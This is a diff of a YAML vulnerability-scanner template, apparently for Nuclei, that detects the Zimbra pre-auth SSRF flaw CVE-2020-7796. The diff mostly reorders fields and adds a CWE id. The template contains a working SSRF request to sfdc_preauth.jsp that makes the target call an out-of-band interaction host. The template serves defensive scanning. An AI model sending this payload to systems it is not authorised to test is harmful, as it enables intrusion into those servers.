@@ -1,5 +1,4 @@
 id: zimbra-preauth-ssrf
-
 info:
   name: Zimbra Collaboration Suite - Server-Side Request Forgery
   author: gy741
@@ -13,22 +12,19 @@ info:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
     cvss-score: 9.8
     cve-id: CVE-2020-7796
-    cwe-id: CWE-918
+    cwe-id: CWE-918,CWE-99
   metadata:
     runzero-review: REJECT/2025-11-07/uses interactsh
     max-request: 1
-  tags: zimbra,ssrf,oast,vuln
-
+  tags: oast,ssrf,vuln,zimbra
 http:
-  - raw:
+  - matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - http
+    raw:
       - |
         GET /service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://{{interactsh-url}}%23.salesforce.com/ HTTP/1.1
         Host: {{Hostname}}
         Accept: */*
-
-    matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the HTTP Interaction
-        words:
-          - "http"
-
